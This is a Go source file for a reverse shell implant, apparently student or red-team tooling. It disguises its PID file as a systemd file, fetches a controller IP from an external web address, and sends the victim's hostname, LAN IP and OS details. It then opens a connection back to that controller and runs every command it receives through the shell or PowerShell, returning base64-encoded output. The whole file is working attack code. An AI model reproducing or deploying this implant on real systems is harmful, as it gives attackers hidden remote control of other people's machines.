//Michael Burke, mdb5315@rit.edu
package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

var HOST_CONNECT string = "10.100.1.101:"

func main() {
	//See if there is already an instance of the process running
	proc := FindProcess()
	if proc {
		//If there is, exit
		fmt.Printf("Process is running!")
		return
	}
	//Delete the pid file, if it exists
	tmpcmd := exec.Command("rm /var/run/systemd.pid")
	tmpcmd.Run()
	//Get the current pid and write it to the file
	currentPid := strconv.Itoa(os.Getpid())
	ioutil.WriteFile("/var/run/systemd.pid", []byte(currentPid), 0644)
	HOST_CONNECT = GetIP() + ":"
	connectPort := GetPort()
	if connectPort == "-1" {
		return
	}
	EstablishConnection(connectPort)
}

func GetIP() string {
	resp, err := http.Get("http://mdbook.me/ip.txt")
	var ip string
	if err == nil {
		body, _ := ioutil.ReadAll(resp.Body)
		line := string(body)
		line = strings.TrimSuffix(line, "\n")
		ip = line
	} else {
		resp, err = http.Get("http://129.21.141.218/ip.txt")
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			line := string(body)
			line = strings.TrimSuffix(line, "\n")
			ip = line
		} else {
			ip = "10.100.0.101"
		}
	}
	return ip
}

func GetPort() string {
	//Get the reverse shell port from the server
	getPort, err := net.Dial("tcp", HOST_CONNECT+"8003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "-1"
	}
	defer getPort.Close()
	// ip := GetOutboundIP()
	osFlavor := "n/a"
	// TODO: add OS flavor
	if runtime.GOOS == "linux" {
		osFlavor = getOS()
	} else if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "os", "get", "Caption")
		out, _ := cmd.Output()
		osFlavor = string(out)
		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
		cmd.Run()
	}
	hostname, _ := os.Hostname()
	sendStr := b64_encode(
		"clientType:Basic Reverse Shell," +
			"lanIP:" + GetOutboundIP() + "," +
			"isEncoded:true" + "," +
			"os:" + runtime.GOOS + "," +
			"osFlavor:" + osFlavor + "," +
			"hostname:" + hostname,
	)
	it, err := getPort.Write([]byte("INFO:{" + sendStr + "}\n"))
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println(it)
	}
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}
func EstablishConnection(port string) {
	//Establish reverse connection to host
	conn, _ := net.Dial("tcp", HOST_CONNECT+port)
	var cmd *exec.Cmd
	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		command = trim(command)
		args := strings.Split(command, " ")
		if args[0] == "cd" {
			os.Chdir(trim(command[3:]))
			conn.Write([]byte("\n"))
		} else {
			if runtime.GOOS == "windows" {
				cmd = exec.Command("powershell.exe", command)
			} else {
				cmd = exec.Command(args[0], args[1:]...)
			}
			out, _ := cmd.CombinedOutput()
			conn.Write([]byte(b64_encode(string(out)) + "\n"))
			cmd.Run()
		}
	}
}

func CheckFileExists(file string) bool {
	//Can use the following if go is actually up to date
	//if _, err := os.Stat(file); errors.Is(err, os.ErrNotExist) {
	//For out-of-date versions of go, use this instead
	if _, err := os.Stat(file); err != nil {
		return false
	}
	return true
}

func CheckPid(pid int) bool {
	//Send a kill signal to the PID to see if the process is running or not
	out, err := exec.Command("kill", "-s", "0", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		log.Println(err)
	}
	if string(out) == "" {
		//Process is running
		return true
	}
	//Process is not running
	return false
}

func FindProcess() bool {
	//See if the pid file exists
	if !CheckFileExists("/var/run/systemd.pid") {
		return false
	}
	//If it does, read the file to get the pids
	dat, err := ioutil.ReadFile("/var/run/systemd.pid")
	if err != nil {
		return false
	}
	//Process and return the pid
	pid := string(dat)
	pid = strings.TrimSuffix(pid, "\n")
	fmt.Printf("PID: " + pid)
	pidint, _ := strconv.Atoi(pid)
	return CheckPid(pidint)
}

func GetOutboundIP() string {
	//Dial a connection to a WAN IP to get the box's correct IP address.
	//Note that this doesn't actually establish a connection,
	//but simply pretends to setup one. This is enough to get us the IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "none"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ip := localAddr.IP
	ipstr := ip.String()
	return ipstr
}

func getOS(isFail ...bool) string {
	var ret_os string
	checkID := false
	//Nifty little code to let us call getOS with or without a parameter
	if len(isFail) > 0 && isFail[0] {
		checkID = true
	}
	//Read /etc/os-release to find what distro the host is running on
	os_str := readFile("/etc/os-release")
	os_split := strings.Split(os_str, "\n")
	for i := 0; i < len(os_split); i++ {
		//Child distros will have ID_LIKE instead of ID. Check for both
		matchString := "ID_LIKE="
		if checkID {
			matchString = "ID="
		}
		if strings.Index(os_split[i], matchString) == 0 {
			ret_os = strings.Replace(os_split[i], matchString, "", 1)
			ret_os = strings.Replace(ret_os, `"`, "", -1)
			break
		}
	}
	if ret_os == "" && !checkID {
		// If ID_LIKE wasn't found, then seach for ID= instead
		return getOS(true)
	}
	return ret_os
}
func trim(str string) string {
	return strings.TrimSuffix(strings.TrimSuffix(str, "\n"), "\r")
}
func readFile(path string) string {
	dat, _ := ioutil.ReadFile(path)
	str := string(dat)
	return str
}
func b64_encode(text string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(text))
	return encoded
}

/**
base 64 decode a message from the server
*/
func b64_decode(text string) string {
	decoded, err := base64.StdEncoding.DecodeString(text)
	if err != nil {
		fmt.Println(err)
	}
	return string(decoded)
}
